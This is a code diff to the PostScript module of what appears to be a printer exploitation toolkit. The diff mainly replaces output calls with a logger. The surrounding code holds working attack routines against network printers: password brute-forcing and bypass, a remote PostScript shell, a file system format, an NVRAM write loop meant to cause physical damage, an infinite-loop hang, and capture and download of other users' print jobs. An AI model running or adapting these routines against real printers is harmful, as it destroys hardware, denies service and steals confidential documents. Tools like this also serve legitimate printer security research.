@@ -1,12 +1,12 @@
 # -*- coding: utf-8 -*-
 
 # python standard library
-import re, os, sys, string, random, json, collections
+import re, os, sys, string, random, json, collections, time
 
 # local pret classes
 from printer import printer
 from operators import operators
-from helper import log, output, conv, file, item, const as c
+from helper import conv, file, item, const as c
 
 class postscript(printer):
   # --------------------------------------------------------------------
@@ -20,13 +20,21 @@ class postscript(printer):
     # send command to printer device              # to get output on some printers
     try:
       cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + footer # + c.UEL
-      # write to logfile
-      log().write(self.logfile, str_send + os.linesep)
+      
+      # write sent data to logfile
+      #self.logger.write(os.linesep + "%%%%%%%%%%%%%%%%%%%%%%%%%% Sending Payload %%%%%%%%%%%%%%%%%%%%%%%%%%" + os.linesep)
+      #self.logger.write("%%% Timestamp: " + time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + os.linesep)
+      #self.logger.write(os.linesep + str_send + os.linesep)
+      #self.logger.write("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%" + os.linesep + os.linesep)
+      
       # sent to printer
       self.send(cmd_send)
+      
       # use random token or error message as delimiter PS responses
       str_recv = self.recv(token + ".*$" + "|" + c.PS_FLUSH, fb, crop, binary)
-      return self.ps_err(str_recv)
+      
+      return_value = self.ps_err(str_recv)
+      return return_value
 
     # handle CTRL+C and exceptions
     except (KeyboardInterrupt, Exception) as e:
@@ -46,7 +54,7 @@ class postscript(printer):
     self.error = None
     msg = item(re.findall(c.PS_ERROR, str_recv))
     if msg: # real postscript command errors
-      output().errmsg("PostScript Error", msg)
+      self.logger.errmsg("PostScript Error", msg)
       self.error = msg
       str_recv = ""
     else: # printer errors or status messages
@@ -66,22 +74,22 @@ class postscript(printer):
       # handle devices that do not support ps output via 'print' or '=='
       if 'x1' in str_recv or self.error: self.iohack = False # all fine
       elif 'x2' in str_recv: # hack required to get output (e.g. brother)
-        output().errmsg('Crippled feedback', '%stdout hack enabled')
+        self.logger.errmsg('Crippled feedback', '%stdout hack enabled')
       else: # busy or not a PS printer or a silent one (e.g. Dell 3110cn)
-        output().errmsg('No feedback', 'Printer busy, non-ps or silent')
+        self.logger.errmsg('No feedback', 'Printer busy, non-ps or silent')
 
   # ------------------------[ shell ]-----------------------------------
   def do_shell(self, arg):
     "Open interactive PostScript shell."
     # politely request poor man's remote postscript shell
-    output().info("Launching PostScript shell. Press CTRL+D to exit.")
+    self.logger.info("Launching PostScript shell. Press CTRL+D to exit.")
     try:
       self.send(c.UEL + c.PS_HEADER + "false echo executive\n")
       while True:
         # use postscript prompt or error message as delimiter
         str_recv = self.recv(c.PS_PROMPT + "$|" + c.PS_FLUSH, False, False)
         # output raw response from printer
-        output().raw(str_recv, "")
+        self.logger.raw(str_recv, "")
         # break on postscript error message
         if re.search(c.PS_FLUSH, str_recv): break
         # fetch user input and send it to postscript shell
@@ -172,14 +180,14 @@ class postscript(printer):
         (size, otime, mtime) = ('-', conv().lsdate(0), conv().lsdate(0))
       elif metadata != c.NONEXISTENT: size, otime, mtime = metadata
       if metadata != c.NONEXISTENT: # we got real or dummy metadata
-        output().psdir(isdir, size, otime, self.basename(name), mtime)
-      else: output().errmsg("Crippled filename", 'Bad interpreter')
+        self.logger.psdir(isdir, size, otime, self.basename(name), mtime)
+      else: self.logger.errmsg("Crippled filename", 'Bad interpreter')
 
   # ------------------------[ find <path> ]-----------------------------
   def do_find(self, arg):
     "Recursively list contents of directory:  find <path>"
     for name in self.dirlist(arg):
-      output().psfind(name)
+      self.logger.psfind(name)
 
   # ------------------------[ mirror <path> ]---------------------------
   def do_mirror(self, arg):
@@ -212,13 +220,14 @@ class postscript(printer):
                         + '} loop', True, True, True)
       return (size, str_recv)
     else:
-      print("File not found.")
+      self.logger.comment("Error - get <file>")
+      self.logger.printAndWrite("File not found.")
       return c.NONEXISTENT
 
   # ------------------------[ put <local file> ]------------------------
   def put(self, path, data, mode='w+'):
     if self.iohack: # brother devices without any writeable volumes
-      output().warning("Writing will probably fail on this device")
+      self.logger.warning("Writing will probably fail on this device")
     # convert to PostScript-compatibe octal notation
     data = ''.join(['\\{:03o}'.format(ord(char)) for char in data])
     self.cmd('/outfile (' + path + ') (' + mode + ') file def\n'
@@ -247,14 +256,15 @@ class postscript(printer):
   # define alias but do not show alias in help
   do_mv = do_rename
   def help_rename(self):
-    print("Rename remote file:  rename <old> <new>")
+    self.logger.comment("help_rename")
+    self.logger.printAndWrite("Rename remote file:  rename <old> <new>")
 
   # ====================================================================
 
   # ------------------------[ id ]--------------------------------------
   def do_id(self, *arg):
     "Show device information."
-    output().info(self.cmd('product print'))
+    self.logger.info(self.cmd('product print'))
 
   # ------------------------[ version ]---------------------------------
   def do_version(self, *arg):
@@ -275,25 +285,25 @@ class postscript(printer):
       '/LicenseID    known {(License:  ) print /LicenseID    get ==} if\n'\
       '/PrinterCode  known {(Device:   ) print /PrinterCode  get ==} if\n'\
       '/EngineCode   known {(Engine:   ) print /EngineCode   get ==} if'
-    output().info(self.cmd(str_send))
+    self.logger.info(self.cmd(str_send))
 
   # ------------------------[ df ]--------------------------------------
   def do_df(self, arg):
     "Show volume information."
-    output().df(('VOLUME', 'TOTAL SIZE', 'FREE SPACE', 'PRIORITY',
+    self.logger.df(('VOLUME', 'TOTAL SIZE', 'FREE SPACE', 'PRIORITY',
     'REMOVABLE', 'MOUNTED', 'HASNAMES', 'WRITEABLE', 'SEARCHABLE'))
     for vol in self.vol_exists():
       str_send = '(' + vol + ') devstatus dup {pop ' + '== ' * 8 + '} if'
       lst_recv = self.cmd(str_send).splitlines()
       values = (vol,) + tuple(lst_recv if len(lst_recv) == 8 else ['-'] * 8)
-      output().df(values)
+      self.logger.df(values)
 
   # ------------------------[ free ]------------------------------------
   def do_free(self, arg):
     "Show available memory."
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-    output().raw("RAM status")
-    output().info(self.cmd('currentsystemparams dup dup dup\n'
+    self.logger.raw("RAM status")
+    self.logger.info(self.cmd('currentsystemparams dup dup dup\n'
                          + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                          + '(size:   ) print /InstalledRam known {\n'
                          + '  /InstalledRam get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
@@ -302,15 +312,15 @@ class postscript(printer):
                          + '  /RamSize get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print}{pop (Not available\\n) print\n'
                          + '} ifelse'))
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-    output().raw("Virtual memory")
-    output().info(self.cmd('vmstatus\n'
+    self.logger.raw("Virtual memory")
+    self.logger.info(self.cmd('vmstatus\n'
                          + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                          + '(max:    ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                          + '(used:   ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\n) print\n'
                          + '(level:  ) print =='))
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-    output().raw("Font cache")
-    output().info(self.cmd('cachestatus\n'
+    self.logger.raw("Font cache")
+    self.logger.info(self.cmd('cachestatus\n'
                          + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                          + '(blimit: ) print ==\n'
                          + '(cmax:   ) print ==\n'
@@ -320,8 +330,8 @@ class postscript(printer):
                          + '(bmax:   ) print ==\n'
                          + '(bsize:  ) print =='))
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-    output().raw("User cache")
-    output().info(self.cmd('ucachestatus\n'
+    self.logger.raw("User cache")
+    self.logger.info(self.cmd('ucachestatus\n'
                          + '/mb 1048576 def /kb 100 def /str 32 string def\n'
                          + '(blimit: ) print ==\n'
                          + '(rmax:   ) print ==\n'
@@ -334,16 +344,16 @@ class postscript(printer):
     "Show available I/O devices."
     str_send = '/str 128 string def (*) {print (\\n) print} str /IODevice resourceforall'
     for dev in self.cmd(str_send).splitlines():
-      output().info(dev)
-      output().raw(self.cmd('(' + dev + ') currentdevparams {exch 128 string '
+      self.logger.info(dev)
+      self.logger.raw(self.cmd('(' + dev + ') currentdevparams {exch 128 string '
                           + 'cvs print (: ) print ==} forall') + os.linesep)
 
   # ------------------------[ uptime ]----------------------------------
   def do_uptime(self, arg):
     "Show system uptime (might be random)."
     str_recv = self.cmd('realtime ==')
-    try: output().info(conv().elapsed(str_recv, 1000))
-    except ValueError: output().info("Not available")
+    try: self.logger.info(conv().elapsed(str_recv, 1000))
+    except ValueError: self.logger.info("Not available")
 
   # ------------------------[ date ]------------------------------------
   def do_date(self, arg):
@@ -352,15 +362,15 @@ class postscript(printer):
                '{(%Calendar%) currentdevparams /DateTime get print}\n'\
                '{(Not available) print} ifelse'
     str_recv = self.cmd(str_send)
-    output().info(str_recv)
+    self.logger.info(str_recv)
 
   # ------------------------[ pagecount ]-------------------------------
   def do_pagecount(self, arg):
     "Show printer's page counter:  pagecount <number>"
-    output().raw("Hardware page counter: ", '')
+    self.logger.raw("Hardware page counter: ", '')
     str_send = 'currentsystemparams dup /PageCount known\n'\
                '{/PageCount get ==}{(Not available) print} ifelse'
-    output().info(self.cmd(str_send))
+    self.logger.info(self.cmd(str_send))
 
   # ====================================================================
 
@@ -387,8 +397,8 @@ class postscript(printer):
     # setsystemparams in which FactoryDefaults is the only entry«
     # **********************************************************
     if not arg:
-      print("No password given, cracking.") # 140k tries/sec on lj4250!
-      output().chitchat("If this ain't successful, try 'unlock bypass'")
+      self.logger.printAndWrite("No password given, cracking.") # 140k tries/sec on lj4250!
+      self.logger.chitchat("If this ain't successful, try 'unlock bypass'")
       arg = self.timeoutcmd('/min 0 def /max ' + str(max) + ' def\n'
               'statusdict begin {min 1 max\n'
               '  {dup checkpassword {== flush stop}{pop} ifelse} for\n'
@@ -396,7 +406,7 @@ class postscript(printer):
     # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # superexec can be used to reset PostScript passwords on most devices
     elif arg == 'bypass':
-      print("Resetting password to zero with super-secret PostScript magic")
+      self.logger.printAndWrite("Resetting password to zero with super-secret PostScript magic")
       self.supercmd('<< /SystemParamsPassword (0)'
       ' /StartJobPassword (0) >> setsystemparams')
       arg = '0' # assume we have successfully reset the passwords to zero
@@ -407,13 +417,13 @@ class postscript(printer):
                         '  /StartJobPassword ()\n' # permanent VM change
                         '  >> setsystemparams\n} stopped ==')
     msg = "Use the 'reset' command to restore factory defaults"
-    if not 'false' in str_recv: output().errmsg("Cannot unlock", msg)
-    else: output().raw("Device unlocked with password: " + arg)
+    if not 'false' in str_recv: self.logger.errmsg("Cannot unlock", msg)
+    else: self.logger.raw("Device unlocked with password: " + arg)
 
   # ------------------------[ restart ]---------------------------------
   def do_restart(self, arg):
     "Restart PostScript interpreter."
-    output().chitchat("Restarting PostScript interpreter.")
+    self.logger.chitchat("Restarting PostScript interpreter.")
     # reset VM, might delete downloaded files and/or restart printer
     self.globalcmd('systemdict /quit get exec')
 
@@ -429,42 +439,42 @@ class postscript(printer):
     power-off, the request is ignored; this reduces the chance that malicious
     jobs will attempt to perform this operation.« '''
     self.cmd('<< /FactoryDefaults true >> setsystemparams', False)
-    output().raw("Printer must be turned off immediately for changes to take effect.")
-    output().raw("This can be accomplished, using the 'restart' command in PJL mode.")
+    self.logger.raw("Printer must be turned off immediately for changes to take effect.")
+    self.logger.raw("This can be accomplished, using the 'restart' command in PJL mode.")
 
   # ------------------------[ format ]----------------------------------
   def do_format(self, arg):
     "Initialize printer's file system:  format <disk>"
     if not self.vol:
-      output().info("Set volume first using 'chvol'")
+      self.logger.info("Set volume first using 'chvol'")
     else:
-      output().warning("Warning: Initializing the printer's file system will whipe-out all")
-      output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
-      if output().countdown("Initializing " + self.vol + " in...", 10, self):
+      self.logger.warning("Warning: Initializing the printer's file system will whipe-out all")
+      self.logger.warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
+      if self.logger.countdown("Initializing " + self.vol + " in...", 10, self):
         str_recv = self.cmd('statusdict begin (' + self.vol + ') () initializedisk end', False)
 
   # ------------------------[ disable ]---------------------------------
   def do_disable(self, arg):
-    output().psonly()
+    self.logger.psonly()
     before = 'true' in self.globalcmd('userdict /showpage known dup ==\n'
                                       '{userdict /showpage undef}\n'
                                       '{/showpage {} def} ifelse')
     after = 'true' in self.cmd('userdict /showpage known ==')
-    if before == after: output().info("Not available") # no change
-    elif before: output().info("Printing is now enabled")
-    elif after: output().info("Printing is now disabled")
+    if before == after: self.logger.info("Not available") # no change
+    elif before: self.logger.info("Printing is now enabled")
+    elif after: self.logger.info("Printing is now disabled")
 
   # define alias but do not show alias in help
   do_enable = do_disable
   def help_disable(self):
-    print("Disable printing functionality.")
+    self.logger.printAndWrite("Disable printing functionality.")
 
   # ------------------------[ destroy ]---------------------------------
   def do_destroy(self, arg):
     "Cause physical damage to printer's NVRAM."
-    output().warning("Warning: This command tries to cause physical damage to the")
-    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
-    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
+    self.logger.warning("Warning: This command tries to cause physical damage to the")
+    self.logger.warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
+    if self.logger.countdown("Starting NVRAM write cycle loop in...", 10, self):
       '''
       ┌───────────────────────────────────────────────────────────┐
       │               how to destroy your printer?                │
@@ -493,9 +503,9 @@ class postscript(printer):
   # ------------------------[ hang ]------------------------------------
   def do_hang(self, arg):
     "Execute PostScript infinite loop."
-    output().warning("Warning: This command causes an infinite loop rendering the")
-    output().warning("device useless until manual restart. Press CTRL+C to abort.")
-    if output().countdown("Executing PostScript infinite loop in...", 10, self):
+    self.logger.warning("Warning: This command causes an infinite loop rendering the")
+    self.logger.warning("device useless until manual restart. Press CTRL+C to abort.")
+    if self.logger.countdown("Executing PostScript infinite loop in...", 10, self):
       self.cmd('{} loop', False)
 
   # ====================================================================
@@ -514,7 +524,7 @@ class postscript(printer):
   complete_overlay = printer.complete_lfiles # files or directories
 
   def overlay(self, data):
-    output().psonly()
+    self.logger.psonly()
     size = conv().filesize(len(data)).strip()
     self.chitchat("Injecting overlay data (" + size + ") into printer memory")
     str_send = '{overlay closefile} stopped % free memory\n'\
@@ -542,10 +552,10 @@ class postscript(printer):
       self.onecmd("help cross")
 
   def help_cross(self):
-    print("Put printer graffiti on all hard copies:  cross <font> <text>")
-    print("Read the docs on how to install custom fonts. Available fonts:")
+    self.logger.printAndWrite("Put printer graffiti on all hard copies:  cross <font> <text>")
+    self.logger.printAndWrite("Read the docs on how to install custom fonts. Available fonts:")
     if len(self.options_cross) > 0: last = sorted(self.options_cross)[-1]
-    for font in sorted(self.options_cross): print(('└─ ' if font == last else '├─ ') + font)
+    for font in sorted(self.options_cross): self.logger.printAndWrite(('└─ ' if font == last else '├─ ') + font)
 
   fontdir = os.path.dirname(os.path.realpath(__file__))\
           + os.path.sep + 'fonts' + os.path.sep
@@ -560,7 +570,7 @@ class postscript(printer):
     "Replace string in documents to be printed:  replace <old> <new>"
     arg = re.split("\s+", arg, 1)
     if len(arg) > 1:
-      output().psonly()
+      self.logger.psonly()
       oldstr, newstr = self.escape(arg[0]), self.escape(arg[1])
       self.globalcmd('/strcat {exch dup length 2 index length add string dup\n'
                       'dup 4 2 roll copy length 4 -1 roll putinterval} def\n'
@@ -584,7 +594,7 @@ class postscript(printer):
     free = '5' # memory limit in megabytes that must at least be free to capture print jobs
     # record future print jobs
     if arg.startswith('start'):
-      output().psonly()
+      self.logger.psonly()
       # PRET commands themself should not be capture if they're performed within ≤ 10s idle
       '''
       ┌──────────┬───────────────────────────────┬───────────────┐
@@ -633,19 +643,18 @@ class postscript(printer):
                  '  %-------------------------------------------------------------------\n'\
                  '  setoldtime                                                          \n'\
                  '  } ifelse} ifelse} stopped} bind def                                 \n'\
-                 '} ifelse} ifelse} bind def                                            \n'\
                  '<< /BeginPage {capturehook} bind >> setpagedevice                     \n'\
                  '(Future print jobs will be captured in memory!)}                      \n'\
                  '{(Cannot capture - unlock me first)} ifelse print'
-      output().raw(self.cmd(str_send))
+      self.logger.raw(self.cmd(str_send))
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # show captured print jobs
     elif arg.startswith('list'):
       # show amount of free virtual memory left to capture print jobs
       vmem = self.cmd('vmstatus exch pop exch pop 32 string cvs print')
-      output().chitchat("Free virtual memory: " + conv().filesize(vmem)
+      self.logger.chitchat("Free virtual memory: " + conv().filesize(vmem)
         + " | Limit to capture: " + conv().filesize(int(free) * 1048576))
-      output().warning(self.cmd('userdict /free known {free not\n'
+      self.logger.warning(self.cmd('userdict /free known {free not\n'
         '{(Memory almost full, will not capture jobs anymore) print} if}\n'
         '{(Capturing print jobs is currently not active) print} ifelse'))
       # get first 100 lines for each captured job
@@ -668,14 +677,14 @@ class postscript(printer):
         jobs.append((date, size, user, name, soft))
       # output metadata for captured jobs
       if jobs:
-        output().joblist(('date', 'size', 'user', 'jobname', 'creator'))
-        output().hline(79)
-        for job in jobs: output().joblist(job)
+        self.logger.joblist(('date', 'size', 'user', 'jobname', 'creator'))
+        self.logger.hline(79)
+        for job in jobs: self.logger.joblist(job)
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # save captured print jobs
     elif arg.startswith('fetch'):
       jobs = self.cmd('userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()
-      if not jobs: output().raw("No jobs captured")
+      if not jobs: self.logger.raw("No jobs captured")
       else:
         for job in jobs:
           # is basename sufficient to sanatize file names? we'll see…
@@ -684,7 +693,7 @@ class postscript(printer):
           lpath = os.path.join(root, job + '.ps')
           self.makedirs(root)
           # download captured job
-          output().raw("Receiving " + lpath)
+          self.logger.raw("Receiving " + lpath)
           data = '%!\n'
           data += self.cmd('/byte (0) def\n'
             'capturedict ' + job + ' get dup resetfile\n'
@@ -692,7 +701,7 @@ class postscript(printer):
             '(%stdout) (w) file byte writestring}\n'
             '{exit} ifelse} loop')
           data = conv().nstrip(data) # remove carriage return chars
-          print(str(len(data)) + " bytes received.")
+          self.logger.printAndWrite(str(len(data)) + " bytes received.")
           # write to local file
           if lpath and data: file().write(lpath, data)
       # be user-friendly and show some info on how to open captured jobs
@@ -704,7 +713,7 @@ class postscript(printer):
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # reprint saved print jobs
     elif arg.endswith('print'):
-      output().raw(self.cmd(
+      self.logger.raw(self.cmd(
        '/str 256 string def /count 0 def\n'
        '/increment {/count 1 count add def} def\n'
        '/msg {(Reprinting recorded job ) print count str\n'
@@ -715,19 +724,19 @@ class postscript(printer):
     #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
     # end capturing print jobs
     elif arg.startswith('stop'):
-      output().raw("Stopping job capture, deleting recorded jobs")
+      self.logger.raw("Stopping job capture, deleting recorded jobs")
       self.globalcmd('<< /BeginPage {} bind /EndPage {} bind >>\n'
                      'setpagedevice userdict /capturedict undef\n')
     else:
       self.help_capture()
 
   def help_capture(self):
-    print("Print job operations:  capture <operation>")
-    print("  capture start   - Record future print jobs.")
-    print("  capture stop    - End capturing print jobs.")
-    print("  capture list    - Show captured print jobs.")
-    print("  capture fetch   - Save captured print jobs.")
-    print("  capture print   - Reprint saved print jobs.")
+    self.logger.printAndWrite("Print job operations:  capture <operation>")
+    self.logger.printAndWrite("  capture start   - Record future print jobs.")
+    self.logger.printAndWrite("  capture stop    - End capturing print jobs.")
+    self.logger.printAndWrite("  capture list    - Show captured print jobs.")
+    self.logger.printAndWrite("  capture fetch   - Save captured print jobs.")
+    self.logger.printAndWrite("  capture print   - Reprint saved print jobs.")
 
   options_capture = ('start', 'stop', 'list', 'fetch', 'print')
   def complete_capture(self, text, line, begidx, endidx):
@@ -736,7 +745,7 @@ class postscript(printer):
   # ------------------------[ hold ]------------------------------------
   def do_hold(self, arg):
     "Enable job retention."
-    output().psonly()
+    self.logger.psonly()
     str_send = 'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                '{/retention 1 def}{/retention 0 def} ifelse\n'\
                '<< /Collate true /CollateDetails\n'\
@@ -744,7 +753,7 @@ class postscript(printer):
                '(Job retention ) print\n'\
                'currentpagedevice (CollateDetails) get (Hold) get 1 ne\n'\
                '{(disabled.) print}{(enabled.) print} ifelse'
-    output().info(self.globalcmd(str_send))
+    self.logger.info(self.globalcmd(str_send))
     self.chitchat("On most devices, jobs can only be reprinted by a local attacker via the")
     self.chitchat("printer's control panel. Stored jobs are sometimes accessible by PS/PJL")
     self.chitchat("file system access or via the embedded web server. If your printer does")
@@ -810,23 +819,23 @@ class postscript(printer):
 
     # ask interpreter if functions are known to systemdict
     for desc, funcs in sorted(functionlist.items()):
-      output().chitchat(desc)
+      self.logger.chitchat(desc)
       commands = ['(' + func  + ': ) print systemdict /'
                + func + ' known ==' for func in funcs]
       str_recv = self.cmd(c.EOL.join(commands), False)
       for line in str_recv.splitlines():
-        output().green(line) if " true" in line else output().warning(line)
+        self.logger.green(line) if " true" in line else self.logger.warning(line)
 
   # ------------------------[ search <key> ]----------------------------
   def do_search(self, arg):
     "Search all dictionaries by key:  search <key>"
-    output().info(self.cmd('(' + arg + ') where {(' + arg + ') get ==} if'))
+    self.logger.info(self.cmd('(' + arg + ') where {(' + arg + ') get ==} if'))
 
   # ------------------------[ dicts ]-----------------------------------
   def do_dicts(self, arg):
     "Return a list of dictionaries and their permissions."
-    output().info("acl   len   max   dictionary")
-    output().info("────────────────────────────")
+    self.logger.info("acl   len   max   dictionary")
+    self.logger.info("────────────────────────────")
     for dict in self.options_dump:
       str_recv = self.cmd('1183615869 ' + dict + '\n'
                           'dup rcheck {(r) print}{(-) print} ifelse\n'
@@ -835,20 +844,20 @@ class postscript(printer):
                           '( ) print dup length 128 string cvs print\n'
                           '( ) print maxlength  128 string cvs print')
       if len(str_recv.split()) == 3:
-        output().info("%-5s %-5s %-5s %s" % tuple(str_recv.split() + [dict]))
+        self.logger.info("%-5s %-5s %-5s %s" % tuple(str_recv.split() + [dict]))
 
   # ------------------------[ dump <dict> ]-----------------------------
   def do_dump(self, arg, resource=False):
     "Dump all values of a dictionary:  dump <dict>"
     dump = self.dictdump(arg, resource)
-    if dump: output().psdict(dump)
+    if dump: self.logger.psdict(dump)
 
   def help_dump(self):
-    print("Dump dictionary:  dump <dict>")
-    # print("If <dict> is empty, the whole dictionary stack is dumped.")
-    print("Standard PostScript dictionaries:")
+    self.logger.printAndWrite("Dump dictionary:  dump <dict>")
+    # self.logger.printAndWrite("If <dict> is empty, the whole dictionary stack is dumped.")
+    self.logger.printAndWrite("Standard PostScript dictionaries:")
     if len(self.options_dump) > 0: last = self.options_dump[-1]
-    for dict in self.options_dump: print(('└─ ' if dict == last else '├─ ') + dict)
+    for dict in self.options_dump: self.logger.printAndWrite(('└─ ' if dict == last else '├─ ') + dict)
 
   # undocumented ... what about proprietary dictionary names?
   options_dump = ('systemdict', 'statusdict', 'userdict', 'globaldict',
@@ -945,7 +954,7 @@ class postscript(printer):
     if not resource: str_send += '}{(<nonexistent>) print} ifelse'
     str_recv = self.clean_json(self.cmd(str_send))
     if str_recv == '<nonexistent>':
-      output().info("Dictionary not found")
+      self.logger.info("Dictionary not found")
     else: # convert ps dictionary to json
       return json.loads(str_recv, object_pairs_hook=collections.OrderedDict, strict=False)
 
@@ -965,17 +974,17 @@ class postscript(printer):
                  ' 128 string /' + cat + ' resourceforall'
       items = self.cmd(str_send).splitlines()
       for item in sorted(items):
-        output().info(item)
+        self.logger.info(item)
         if dump: self.do_dump('/' + item + ' /' + cat + ' findresource', True)
     else:
       self.onecmd("help resource")
 
   def help_resource(self):
     self.populate_resource()
-    print("List or dump PostScript resource:  resource <category> [dump]")
-    print("Available resources on this device:")
+    self.logger.printAndWrite("List or dump PostScript resource:  resource <category> [dump]")
+    self.logger.printAndWrite("Available resources on this device:")
     if len(self.options_resource) > 0: last = sorted(self.options_resource)[-1]
-    for res in sorted(self.options_resource): print(('└─ ' if res == last else '├─ ') + res)
+    for res in sorted(self.options_resource): self.logger.printAndWrite(('└─ ' if res == last else '├─ ') + res)
 
   options_resource = []
   def complete_resource(self, text, line, begidx, endidx):
@@ -1014,9 +1023,9 @@ class postscript(printer):
     if arg in self.options_config.keys():
       key = self.options_config[arg]
       if arg == 'copies' and not val: return self.help_config()
-      output().psonly()
+      self.logger.psonly()
       val = val or 'currentpagedevice /' + key + ' get not'
-      output().info(self.globalcmd(
+      self.logger.info(self.globalcmd(
         'currentpagedevice /' + key + ' known\n'
         '{<< /' + key + ' ' + val + ' >> setpagedevice\n'
         '(' + key + ' ) print currentpagedevice /' + key + ' get\n'
@@ -1027,12 +1036,12 @@ class postscript(printer):
       self.help_config()
 
   def help_config(self):
-    print("Change printer settings:  config <setting>")
-    print("  duplex      - Set duplex printing.")
-    print("  copies #    - Set number of copies.")
-    print("  economode   - Set economic mode.")
-    print("  negative    - Set negative print.")
-    print("  mirror      - Set mirror inversion.")
+    self.logger.printAndWrite("Change printer settings:  config <setting>")
+    self.logger.printAndWrite("  duplex      - Set duplex printing.")
+    self.logger.printAndWrite("  copies #    - Set number of copies.")
+    self.logger.printAndWrite("  economode   - Set economic mode.")
+    self.logger.printAndWrite("  negative    - Set negative print.")
+    self.logger.printAndWrite("  mirror      - Set mirror inversion.")
 
   options_config = {'duplex'   : 'Duplex',
                     'copies'   : 'NumCopies',
